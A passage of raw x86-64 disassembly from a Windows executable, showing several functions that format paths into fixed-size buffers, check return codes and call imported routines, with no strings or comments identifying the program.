   140003cb3:	48 8b cf             	mov    %rdi,%rcx
   140003cb6:	e8 95 4b 00 00       	call   0x140008850
   140003cbb:	85 c0                	test   %eax,%eax
   140003cbd:	79 09                	jns    0x140003cc8
   140003cbf:	48 8d 0d f2 83 02 00 	lea    0x283f2(%rip),%rcx        # 0x14002c0b8
   140003cc6:	eb a0                	jmp    0x140003c68
   140003cc8:	48 8d 9f 22 20 00 00 	lea    0x2022(%rdi),%rbx
   140003ccf:	e9 b3 00 00 00       	jmp    0x140003d87
   140003cd4:	48 8d 0d ed 82 02 00 	lea    0x282ed(%rip),%rcx        # 0x14002bfc8
   140003cdb:	e8 40 4d 00 00       	call   0x140008a20
   140003ce0:	48 8b f0             	mov    %rax,%rsi
   140003ce3:	48 85 c0             	test   %rax,%rax
   140003ce6:	74 4d                	je     0x140003d35
   140003ce8:	80 38 00             	cmpb   $0x0,(%rax)
   140003ceb:	74 48                	je     0x140003d35
   140003ced:	48 8d 9f 22 20 00 00 	lea    0x2022(%rdi),%rbx
   140003cf4:	4c 8b c8             	mov    %rax,%r9
   140003cf7:	48 8b cb             	mov    %rbx,%rcx
   140003cfa:	4c 8d 05 7b 7d 02 00 	lea    0x27d7b(%rip),%r8        # 0x14002ba7c
   140003d01:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003d06:	e8 75 df ff ff       	call   0x140001c80
   140003d0b:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140003d10:	7c 19                	jl     0x140003d2b
   140003d12:	48 8d 0d 07 84 02 00 	lea    0x28407(%rip),%rcx        # 0x14002c120
   140003d19:	e8 f2 e9 ff ff       	call   0x140002710
   140003d1e:	48 8b ce             	mov    %rsi,%rcx
   140003d21:	e8 7a 12 01 00       	call   0x140014fa0
   140003d26:	e9 42 ff ff ff       	jmp    0x140003c6d
   140003d2b:	48 8b ce             	mov    %rsi,%rcx
   140003d2e:	e8 6d 12 01 00       	call   0x140014fa0
   140003d33:	eb 52                	jmp    0x140003d87
   140003d35:	48 8d 0d a4 83 02 00 	lea    0x283a4(%rip),%rcx        # 0x14002c0e0
   140003d3c:	e9 27 ff ff ff       	jmp    0x140003c68
   140003d41:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140003d45:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003d4a:	e8 81 07 00 00       	call   0x1400044d0
   140003d4f:	4c 8b 87 70 30 00 00 	mov    0x3070(%rdi),%r8
   140003d56:	48 8d 9f 22 20 00 00 	lea    0x2022(%rdi),%rbx
   140003d5d:	48 8b cb             	mov    %rbx,%rcx
   140003d60:	4d 85 c0             	test   %r8,%r8
   140003d63:	74 0c                	je     0x140003d71
   140003d65:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140003d6a:	e8 b1 08 00 00       	call   0x140004620
   140003d6f:	eb 16                	jmp    0x140003d87
   140003d71:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140003d76:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003d7b:	4c 8d 05 fa 7c 02 00 	lea    0x27cfa(%rip),%r8        # 0x14002ba7c
   140003d82:	e8 f9 de ff ff       	call   0x140001c80
   140003d87:	48 8b 87 10 20 00 00 	mov    0x2010(%rdi),%rax
   140003d8e:	48 83 b8 20 10 00 00 	cmpq   $0x0,0x1020(%rax)
   140003d95:	00 
   140003d96:	74 2c                	je     0x140003dc4
   140003d98:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003d9f:	74 23                	je     0x140003dc4
   140003da1:	41 80 3e 00          	cmpb   $0x0,(%r14)
   140003da5:	75 1d                	jne    0x140003dc4
   140003da7:	33 c9                	xor    %ecx,%ecx
   140003da9:	ff 15 39 73 02 00    	call   *0x27339(%rip)        # 0x14002b0e8
   140003daf:	33 d2                	xor    %edx,%edx
   140003db1:	48 8d 0d 90 83 02 00 	lea    0x28390(%rip),%rcx        # 0x14002c148
   140003db8:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003dbe:	ff 15 1c 73 02 00    	call   *0x2731c(%rip)        # 0x14002b0e0
   140003dc4:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003dca:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140003dcf:	48 8b cb             	mov    %rbx,%rcx
   140003dd2:	e8 29 56 00 00       	call   0x140009400
   140003dd7:	48 85 c0             	test   %rax,%rax
   140003dda:	75 0c                	jne    0x140003de8
   140003ddc:	48 8d 0d 8d 83 02 00 	lea    0x2838d(%rip),%rcx        # 0x14002c170
   140003de3:	e9 80 fe ff ff       	jmp    0x140003c68
   140003de8:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003ded:	ff 15 f5 72 02 00    	call   *0x272f5(%rip)        # 0x14002b0e8
   140003df3:	48 8b 87 10 20 00 00 	mov    0x2010(%rdi),%rax
   140003dfa:	32 db                	xor    %bl,%bl
   140003dfc:	48 83 b8 20 10 00 00 	cmpq   $0x0,0x1020(%rax)
   140003e03:	00 
   140003e04:	0f 84 f7 00 00 00    	je     0x140003f01
   140003e0a:	48 8d 0d f7 83 02 00 	lea    0x283f7(%rip),%rcx        # 0x14002c208
   140003e11:	e8 0a 4c 00 00       	call   0x140008a20
   140003e16:	48 85 c0             	test   %rax,%rax
   140003e19:	74 17                	je     0x140003e32
   140003e1b:	0f b6 10             	movzbl (%rax),%edx
   140003e1e:	83 ea 31             	sub    $0x31,%edx
   140003e21:	75 0a                	jne    0x140003e2d
   140003e23:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   140003e27:	41 0f b6 cf          	movzbl %r15b,%ecx
   140003e2b:	2b d1                	sub    %ecx,%edx
   140003e2d:	85 d2                	test   %edx,%edx
   140003e2f:	0f 94 c3             	sete   %bl
   140003e32:	48 8b c8             	mov    %rax,%rcx
   140003e35:	e8 66 11 01 00       	call   0x140014fa0
   140003e3a:	84 db                	test   %bl,%bl
   140003e3c:	0f 85 b0 00 00 00    	jne    0x140003ef2
   140003e42:	41 0f b6 06          	movzbl (%r14),%eax
   140003e46:	3c 02                	cmp    $0x2,%al
   140003e48:	0f 83 a4 00 00 00    	jae    0x140003ef2
   140003e4e:	38 9f 20 20 00 00    	cmp    %bl,0x2020(%rdi)
   140003e54:	74 09                	je     0x140003e5f
   140003e56:	84 c0                	test   %al,%al
   140003e58:	74 0d                	je     0x140003e67
   140003e5a:	e9 a2 00 00 00       	jmp    0x140003f01
   140003e5f:	3c 01                	cmp    $0x1,%al
   140003e61:	0f 85 9a 00 00 00    	jne    0x140003f01
   140003e67:	e8 44 2f 00 00       	call   0x140006db0
   140003e6c:	48 8d 9f 18 20 00 00 	lea    0x2018(%rdi),%rbx
   140003e73:	48 8b d7             	mov    %rdi,%rdx
   140003e76:	48 8b c8             	mov    %rax,%rcx
   140003e79:	48 89 03             	mov    %rax,(%rbx)
   140003e7c:	e8 af 34 00 00       	call   0x140007330
   140003e81:	85 c0                	test   %eax,%eax
   140003e83:	74 09                	je     0x140003e8e
   140003e85:	48 8d 0d a4 83 02 00 	lea    0x283a4(%rip),%rcx        # 0x14002c230
   140003e8c:	eb 4d                	jmp    0x140003edb
   140003e8e:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003e95:	74 18                	je     0x140003eaf
   140003e97:	48 8b 0b             	mov    (%rbx),%rcx
   140003e9a:	48 8b d7             	mov    %rdi,%rdx
   140003e9d:	e8 4e 2f 00 00       	call   0x140006df0
   140003ea2:	85 c0                	test   %eax,%eax
   140003ea4:	74 09                	je     0x140003eaf
   140003ea6:	48 8d 0d b3 83 02 00 	lea    0x283b3(%rip),%rcx        # 0x14002c260
   140003ead:	eb 2c                	jmp    0x140003edb
   140003eaf:	48 8b 0b             	mov    (%rbx),%rcx
   140003eb2:	e8 e9 32 00 00       	call   0x1400071a0
   140003eb7:	85 c0                	test   %eax,%eax
   140003eb9:	74 09                	je     0x140003ec4
   140003ebb:	48 8d 0d de 83 02 00 	lea    0x283de(%rip),%rcx        # 0x14002c2a0
   140003ec2:	eb 17                	jmp    0x140003edb
   140003ec4:	48 8b 0b             	mov    (%rbx),%rcx
   140003ec7:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140003ecb:	e8 10 36 00 00       	call   0x1400074e0
   140003ed0:	85 c0                	test   %eax,%eax
   140003ed2:	74 2d                	je     0x140003f01
   140003ed4:	48 8d 0d 05 84 02 00 	lea    0x28405(%rip),%rcx        # 0x14002c2e0
   140003edb:	e8 70 eb ff ff       	call   0x140002a50
   140003ee0:	48 8b 0b             	mov    (%rbx),%rcx
   140003ee3:	e8 c8 30 00 00       	call   0x140006fb0
   140003ee8:	48 8b cb             	mov    %rbx,%rcx
   140003eeb:	e8 70 2e 00 00       	call   0x140006d60
   140003ef0:	eb 0f                	jmp    0x140003f01
   140003ef2:	49 8b d5             	mov    %r13,%rdx
   140003ef5:	48 8d 0d 0c 81 02 00 	lea    0x2810c(%rip),%rcx        # 0x14002c008
   140003efc:	e8 2f 4c 00 00       	call   0x140008b30
   140003f01:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003f08:	0f 84 ee 00 00 00    	je     0x140003ffc
   140003f0e:	80 bf 21 20 00 00 00 	cmpb   $0x0,0x2021(%rdi)
   140003f15:	0f 85 e1 00 00 00    	jne    0x140003ffc
   140003f1b:	48 8b cf             	mov    %rdi,%rcx
   140003f1e:	e8 9d f4 ff ff       	call   0x1400033c0
   140003f23:	85 c0                	test   %eax,%eax
   140003f25:	0f 88 42 fd ff ff    	js     0x140003c6d
   140003f2b:	48 8d 8f 38 30 00 00 	lea    0x3038(%rdi),%rcx
   140003f32:	e8 89 51 00 00       	call   0x1400090c0
   140003f37:	48 83 bf 18 20 00 00 	cmpq   $0x0,0x2018(%rdi)
   140003f3e:	00 
   140003f3f:	75 23                	jne    0x140003f64
   140003f41:	45 33 c9             	xor    %r9d,%r9d
   140003f44:	45 33 c0             	xor    %r8d,%r8d
   140003f47:	33 d2                	xor    %edx,%edx
   140003f49:	33 c9                	xor    %ecx,%ecx
   140003f4b:	ff 15 b7 74 02 00    	call   *0x274b7(%rip)        # 0x14002b408
   140003f51:	45 33 c9             	xor    %r9d,%r9d
   140003f54:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003f59:	45 33 c0             	xor    %r8d,%r8d
   140003f5c:	33 d2                	xor    %edx,%edx
   140003f5e:	ff 15 ac 74 02 00    	call   *0x274ac(%rip)        # 0x14002b410
   140003f64:	48 8d 97 22 20 00 00 	lea    0x2022(%rdi),%rdx
   140003f6b:	48 8d 0d 56 80 02 00 	lea    0x28056(%rip),%rcx        # 0x14002bfc8
   140003f72:	e8 b9 4b 00 00       	call   0x140008b30
   140003f77:	48 8b cf             	mov    %rdi,%rcx
   140003f7a:	e8 51 4c 00 00       	call   0x140008bd0
   140003f7f:	48 8b 8f 18 20 00 00 	mov    0x2018(%rdi),%rcx
   140003f86:	8b f0                	mov    %eax,%esi
   140003f88:	e8 23 30 00 00       	call   0x140006fb0
   140003f8d:	48 8d 8f 18 20 00 00 	lea    0x2018(%rdi),%rcx
   140003f94:	e8 c7 2d 00 00       	call   0x140006d60
   140003f99:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   140003fa0:	e8 2b 4b 00 00       	call   0x140008ad0
   140003fa5:	85 c0                	test   %eax,%eax
   140003fa7:	79 40                	jns    0x140003fe9
   140003fa9:	48 8b cf             	mov    %rdi,%rcx
   140003fac:	e8 4f 52 00 00       	call   0x140009200
   140003fb1:	85 c0                	test   %eax,%eax
   140003fb3:	79 34                	jns    0x140003fe9
   140003fb5:	80 bf 31 30 00 00 00 	cmpb   $0x0,0x3031(%rdi)
   140003fbc:	48 8d 97 22 20 00 00 	lea    0x2022(%rdi),%rdx
   140003fc3:	48 8d 0d 36 83 02 00 	lea    0x28336(%rip),%rcx        # 0x14002c300
   140003fca:	74 18                	je     0x140003fe4
   140003fcc:	e8 3f e7 ff ff       	call   0x140002710
   140003fd1:	48 8d 8f 10 20 00 00 	lea    0x2010(%rdi),%rcx
   140003fd8:	e8 23 d9 ff ff       	call   0x140001900
   140003fdd:	8b f5                	mov    %ebp,%esi
   140003fdf:	e9 89 fc ff ff       	jmp    0x140003c6d
   140003fe4:	e8 67 ea ff ff       	call   0x140002a50
   140003fe9:	48 8d 8f 10 20 00 00 	lea    0x2010(%rdi),%rcx
   140003ff0:	e8 0b d9 ff ff       	call   0x140001900
   140003ff5:	8b ee                	mov    %esi,%ebp
   140003ff7:	e9 71 fc ff ff       	jmp    0x140003c6d
   140003ffc:	48 83 bf 18 20 00 00 	cmpq   $0x0,0x2018(%rdi)
   140004003:	00 
   140004004:	75 23                	jne    0x140004029
   140004006:	45 33 c9             	xor    %r9d,%r9d
   140004009:	45 33 c0             	xor    %r8d,%r8d
   14000400c:	33 d2                	xor    %edx,%edx
   14000400e:	33 c9                	xor    %ecx,%ecx
   140004010:	ff 15 f2 73 02 00    	call   *0x273f2(%rip)        # 0x14002b408
   140004016:	45 33 c9             	xor    %r9d,%r9d
   140004019:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000401e:	45 33 c0             	xor    %r8d,%r8d
   140004021:	33 d2                	xor    %edx,%edx
   140004023:	ff 15 e7 73 02 00    	call   *0x273e7(%rip)        # 0x14002b410
   140004029:	48 8b cf             	mov    %rdi,%rcx
   14000402c:	e8 6f f6 ff ff       	call   0x1400036a0
   140004031:	48 8b cf             	mov    %rdi,%rcx
   140004034:	e8 27 f3 ff ff       	call   0x140003360
   140004039:	48 8b cf             	mov    %rdi,%rcx
   14000403c:	8b d8                	mov    %eax,%ebx
   14000403e:	e8 2d f6 ff ff       	call   0x140003670
   140004043:	48 8b 8f 18 20 00 00 	mov    0x2018(%rdi),%rcx
   14000404a:	e8 61 2f 00 00       	call   0x140006fb0
   14000404f:	48 8d 8f 18 20 00 00 	lea    0x2018(%rdi),%rcx
   140004056:	e8 05 2d 00 00       	call   0x140006d60
   14000405b:	8b c3                	mov    %ebx,%eax
   14000405d:	e9 0d fc ff ff       	jmp    0x140003c6f
   140004062:	cc                   	int3
   140004063:	cc                   	int3
   140004064:	cc                   	int3
   140004065:	cc                   	int3
   140004066:	cc                   	int3
   140004067:	cc                   	int3
   140004068:	cc                   	int3
   140004069:	cc                   	int3
   14000406a:	cc                   	int3
   14000406b:	cc                   	int3
   14000406c:	cc                   	int3
   14000406d:	cc                   	int3
   14000406e:	cc                   	int3
   14000406f:	cc                   	int3
   140004070:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004075:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000407a:	57                   	push   %rdi
   14000407b:	48 83 ec 20          	sub    $0x20,%rsp
   14000407f:	48 8b f9             	mov    %rcx,%rdi
   140004082:	33 f6                	xor    %esi,%esi
   140004084:	48 8b 89 18 20 00 00 	mov    0x2018(%rcx),%rcx
   14000408b:	e8 20 2f 00 00       	call   0x140006fb0
   140004090:	48 8d 8f 18 20 00 00 	lea    0x2018(%rdi),%rcx
   140004097:	e8 c4 2c 00 00       	call   0x140006d60
   14000409c:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   1400040a3:	e8 28 4a 00 00       	call   0x140008ad0
   1400040a8:	85 c0                	test   %eax,%eax
   1400040aa:	79 34                	jns    0x1400040e0
   1400040ac:	48 8b cf             	mov    %rdi,%rcx
   1400040af:	e8 4c 51 00 00       	call   0x140009200
   1400040b4:	85 c0                	test   %eax,%eax
   1400040b6:	79 28                	jns    0x1400040e0
   1400040b8:	48 8d 97 22 20 00 00 	lea    0x2022(%rdi),%rdx
   1400040bf:	48 8d 0d 3a 82 02 00 	lea    0x2823a(%rip),%rcx        # 0x14002c300
   1400040c6:	40 38 b7 31 30 00 00 	cmp    %sil,0x3031(%rdi)
   1400040cd:	74 0c                	je     0x1400040db
   1400040cf:	e8 3c e6 ff ff       	call   0x140002710
   1400040d4:	be ff ff ff ff       	mov    $0xffffffff,%esi
   1400040d9:	eb 05                	jmp    0x1400040e0
   1400040db:	e8 70 e9 ff ff       	call   0x140002a50
   1400040e0:	48 8d 8f 10 20 00 00 	lea    0x2010(%rdi),%rcx
   1400040e7:	e8 14 d8 ff ff       	call   0x140001900
   1400040ec:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400040f1:	8b c6                	mov    %esi,%eax
   1400040f3:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400040f8:	48 83 c4 20          	add    $0x20,%rsp
   1400040fc:	5f                   	pop    %rdi
   1400040fd:	c3                   	ret
   1400040fe:	cc                   	int3
   1400040ff:	cc                   	int3
   140004100:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004105:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000410a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000410f:	53                   	push   %rbx
   140004110:	56                   	push   %rsi
   140004111:	57                   	push   %rdi
   140004112:	48 83 ec 30          	sub    $0x30,%rsp
   140004116:	48 8b da             	mov    %rdx,%rbx
   140004119:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   14000411e:	48 8b f9             	mov    %rcx,%rdi
   140004121:	e8 1a cf ff ff       	call   0x140001040
   140004126:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   14000412b:	4c 8b cb             	mov    %rbx,%r9
   14000412e:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140004134:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000413b:	00 00 
   14000413d:	48 8b d7             	mov    %rdi,%rdx
   140004140:	48 8b 08             	mov    (%rax),%rcx
   140004143:	48 83 c9 02          	or     $0x2,%rcx
   140004147:	e8 a8 08 01 00       	call   0x1400149f4
   14000414c:	85 c0                	test   %eax,%eax
   14000414e:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140004153:	0f 48 c1             	cmovs  %ecx,%eax
   140004156:	3d 00 10 00 00       	cmp    $0x1000,%eax
   14000415b:	7c 0a                	jl     0x140004167
   14000415d:	8b c1                	mov    %ecx,%eax
   14000415f:	48 83 c4 30          	add    $0x30,%rsp
   140004163:	5f                   	pop    %rdi
   140004164:	5e                   	pop    %rsi
   140004165:	5b                   	pop    %rbx
   140004166:	c3                   	ret
   140004167:	48 8b cf             	mov    %rdi,%rcx
   14000416a:	e8 e1 03 00 00       	call   0x140004550
   14000416f:	48 83 c4 30          	add    $0x30,%rsp
   140004173:	5f                   	pop    %rdi
   140004174:	5e                   	pop    %rsi
   140004175:	5b                   	pop    %rbx
   140004176:	c3                   	ret
   140004177:	cc                   	int3
   140004178:	cc                   	int3
   140004179:	cc                   	int3
   14000417a:	cc                   	int3
   14000417b:	cc                   	int3
   14000417c:	cc                   	int3
   14000417d:	cc                   	int3
   14000417e:	cc                   	int3
   14000417f:	cc                   	int3
   140004180:	40 53                	rex push %rbx
   140004182:	55                   	push   %rbp
   140004183:	56                   	push   %rsi
   140004184:	57                   	push   %rdi
   140004185:	41 56                	push   %r14
   140004187:	b8 60 40 00 00       	mov    $0x4060,%eax
   14000418c:	e8 2f 87 00 00       	call   0x14000c8c0
   140004191:	48 2b e0             	sub    %rax,%rsp
   140004194:	48 8b 05 a5 9e 03 00 	mov    0x39ea5(%rip),%rax        # 0x14003e040
   14000419b:	48 33 c4             	xor    %rsp,%rax
   14000419e:	48 89 84 24 50 40 00 	mov    %rax,0x4050(%rsp)
   1400041a5:	00 
   1400041a6:	4c 8b b4 24 b0 40 00 	mov    0x40b0(%rsp),%r14
   1400041ad:	00 
   1400041ae:	48 8b f2             	mov    %rdx,%rsi
   1400041b1:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   1400041b5:	48 8b d9             	mov    %rcx,%rbx
   1400041b8:	48 8d 8c 24 50 10 00 	lea    0x1050(%rsp),%rcx
   1400041bf:	00 
   1400041c0:	49 8b e9             	mov    %r9,%rbp
   1400041c3:	49 8b f8             	mov    %r8,%rdi
   1400041c6:	e8 05 03 00 00       	call   0x1400044d0
   1400041cb:	48 8b d7             	mov    %rdi,%rdx
   1400041ce:	48 8d 8c 24 50 30 00 	lea    0x3050(%rsp),%rcx
   1400041d5:	00 
   1400041d6:	e8 f5 02 00 00       	call   0x1400044d0
   1400041db:	48 8b 83 70 30 00 00 	mov    0x3070(%rbx),%rax
   1400041e2:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   1400041e9:	00 
   1400041ea:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   1400041f1:	00 
   1400041f2:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   1400041f8:	48 85 c0             	test   %rax,%rax
   1400041fb:	74 2f                	je     0x14000422c
   1400041fd:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140004202:	48 8d 15 47 83 02 00 	lea    0x28347(%rip),%rdx        # 0x14002c550
   140004209:	44 89 4c 24 38       	mov    %r9d,0x38(%rsp)
   14000420e:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004213:	48 8d 84 24 50 30 00 	lea    0x3050(%rsp),%rax
   14000421a:	00 
   14000421b:	44 89 4c 24 28       	mov    %r9d,0x28(%rsp)
   140004220:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004225:	e8 d6 fe ff ff       	call   0x140004100
   14000422a:	eb 26                	jmp    0x140004252
   14000422c:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140004231:	48 8d 84 24 50 30 00 	lea    0x3050(%rsp),%rax
   140004238:	00 
   140004239:	c7 44 24 28 5c 00 00 	movl   $0x5c,0x28(%rsp)
   140004240:	00 
   140004241:	48 8d 15 18 83 02 00 	lea    0x28318(%rip),%rdx        # 0x14002c560
   140004248:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000424d:	e8 ae fe ff ff       	call   0x140004100
   140004252:	83 f8 01             	cmp    $0x1,%eax
   140004255:	75 35                	jne    0x14000428c
   140004257:	49 8b d6             	mov    %r14,%rdx
   14000425a:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   140004261:	00 
   140004262:	e8 79 3a 00 00       	call   0x140007ce0
   140004267:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000426a:	0f 85 7a 01 00 00    	jne    0x1400043ea
   140004270:	4c 8d 84 24 50 20 00 	lea    0x2050(%rsp),%r8
   140004277:	00 
   140004278:	48 8b d5             	mov    %rbp,%rdx
   14000427b:	48 8d 0d ee 82 02 00 	lea    0x282ee(%rip),%rcx        # 0x14002c570
   140004282:	e8 89 e4 ff ff       	call   0x140002710
   140004287:	e9 84 01 00 00       	jmp    0x140004410
   14000428c:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   140004292:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004297:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   14000429e:	00 
   14000429f:	48 8d 15 f2 82 02 00 	lea    0x282f2(%rip),%rdx        # 0x14002c598
   1400042a6:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400042ab:	e8 50 fe ff ff       	call   0x140004100
   1400042b0:	83 f8 01             	cmp    $0x1,%eax
   1400042b3:	74 61                	je     0x140004316
   1400042b5:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   1400042bb:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400042c0:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   1400042c7:	00 
   1400042c8:	48 8d 15 d9 82 02 00 	lea    0x282d9(%rip),%rdx        # 0x14002c5a8
   1400042cf:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400042d4:	e8 27 fe ff ff       	call   0x140004100
   1400042d9:	83 f8 01             	cmp    $0x1,%eax
   1400042dc:	74 38                	je     0x140004316
   1400042de:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   1400042e4:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400042e9:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   1400042f0:	00 
   1400042f1:	48 8d 15 6c 7a 02 00 	lea    0x27a6c(%rip),%rdx        # 0x14002bd64
   1400042f8:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400042fd:	e8 fe fd ff ff       	call   0x140004100
   140004302:	83 f8 01             	cmp    $0x1,%eax
   140004305:	74 0f                	je     0x140004316
   140004307:	48 8b d7             	mov    %rdi,%rdx
   14000430a:	48 8d 0d a7 82 02 00 	lea    0x282a7(%rip),%rcx        # 0x14002c5b8
   140004311:	e9 f5 00 00 00       	jmp    0x14000440b
   140004316:	48 8b 1e             	mov    (%rsi),%rbx
   140004319:	33 ff                	xor    %edi,%edi
   14000431b:	48 85 db             	test   %rbx,%rbx
   14000431e:	74 63                	je     0x140004383
   140004320:	44 8b cf             	mov    %edi,%r9d
   140004323:	0f 1f 40 00          	nopl   0x0(%rax)
   140004327:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000432e:	00 00 
   140004330:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140004335:	48 8b c3             	mov    %rbx,%rax
   140004338:	4c 2b c3             	sub    %rbx,%r8
   14000433b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004340:	0f b6 10             	movzbl (%rax),%edx
   140004343:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   140004348:	2b d1                	sub    %ecx,%edx
   14000434a:	75 07                	jne    0x140004353
   14000434c:	48 ff c0             	inc    %rax
   14000434f:	85 c9                	test   %ecx,%ecx
   140004351:	75 ed                	jne    0x140004340
   140004353:	85 d2                	test   %edx,%edx
   140004355:	74 25                	je     0x14000437c
   140004357:	4a 8b 5c ce 08       	mov    0x8(%rsi,%r9,8),%rbx
   14000435c:	49 ff c1             	inc    %r9
   14000435f:	ff c7                	inc    %edi
   140004361:	48 85 db             	test   %rbx,%rbx
   140004364:	75 ca                	jne    0x140004330
   140004366:	83 ff 14             	cmp    $0x14,%edi
   140004369:	7c 18                	jl     0x140004383
   14000436b:	48 8d 0d 96 81 02 00 	lea    0x28196(%rip),%rcx        # 0x14002c508
   140004372:	e8 99 e3 ff ff       	call   0x140002710
   140004377:	e9 83 00 00 00       	jmp    0x1400043ff
   14000437c:	48 85 db             	test   %rbx,%rbx
   14000437f:	75 1b                	jne    0x14000439c
   140004381:	eb 7c                	jmp    0x1400043ff
   140004383:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004388:	e8 c3 d5 ff ff       	call   0x140001950
   14000438d:	48 8b d8             	mov    %rax,%rbx
   140004390:	48 85 c0             	test   %rax,%rax
   140004393:	74 59                	je     0x1400043ee
   140004395:	48 63 c7             	movslq %edi,%rax
   140004398:	48 89 1c c6          	mov    %rbx,(%rsi,%rax,8)
   14000439c:	48 8b d5             	mov    %rbp,%rdx
   14000439f:	48 8b cb             	mov    %rbx,%rcx
   1400043a2:	e8 99 d4 ff ff       	call   0x140001840
   1400043a7:	48 85 c0             	test   %rax,%rax
   1400043aa:	75 16                	jne    0x1400043c2
   1400043ac:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400043b1:	48 8b d5             	mov    %rbp,%rdx
   1400043b4:	48 8d 0d 65 82 02 00 	lea    0x28265(%rip),%rcx        # 0x14002c620
   1400043bb:	e8 50 e3 ff ff       	call   0x140002710
   1400043c0:	eb 4e                	jmp    0x140004410
   1400043c2:	4d 8b c6             	mov    %r14,%r8
   1400043c5:	48 8b d0             	mov    %rax,%rdx
   1400043c8:	48 8b cb             	mov    %rbx,%rcx
   1400043cb:	e8 30 d2 ff ff       	call   0x140001600
   1400043d0:	85 c0                	test   %eax,%eax
   1400043d2:	79 16                	jns    0x1400043ea
   1400043d4:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400043d9:	48 8b d5             	mov    %rbp,%rdx
   1400043dc:	48 8d 0d 7d 82 02 00 	lea    0x2827d(%rip),%rcx        # 0x14002c660
   1400043e3:	e8 28 e3 ff ff       	call   0x140002710
   1400043e8:	eb 26                	jmp    0x140004410
   1400043ea:	33 c0                	xor    %eax,%eax
   1400043ec:	eb 27                	jmp    0x140004415
   1400043ee:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400043f3:	48 8d 0d 36 81 02 00 	lea    0x28136(%rip),%rcx        # 0x14002c530
   1400043fa:	e8 11 e3 ff ff       	call   0x140002710
   1400043ff:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004404:	48 8d 0d dd 81 02 00 	lea    0x281dd(%rip),%rcx        # 0x14002c5e8
   14000440b:	e8 00 e3 ff ff       	call   0x140002710
   140004410:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004415:	48 8b 8c 24 50 40 00 	mov    0x4050(%rsp),%rcx
   14000441c:	00 
   14000441d:	48 33 cc             	xor    %rsp,%rcx
   140004420:	e8 9b 81 00 00       	call   0x14000c5c0
   140004425:	48 81 c4 60 40 00 00 	add    $0x4060,%rsp
   14000442c:	41 5e                	pop    %r14
   14000442e:	5f                   	pop    %rdi
   14000442f:	5e                   	pop    %rsi
   140004430:	5d                   	pop    %rbp
   140004431:	5b                   	pop    %rbx
   140004432:	c3                   	ret
   140004433:	cc                   	int3
   140004434:	cc                   	int3
   140004435:	cc                   	int3
   140004436:	cc                   	int3
   140004437:	cc                   	int3
   140004438:	cc                   	int3
   140004439:	cc                   	int3
   14000443a:	cc                   	int3
   14000443b:	cc                   	int3
   14000443c:	cc                   	int3
   14000443d:	cc                   	int3
   14000443e:	cc                   	int3
   14000443f:	cc                   	int3
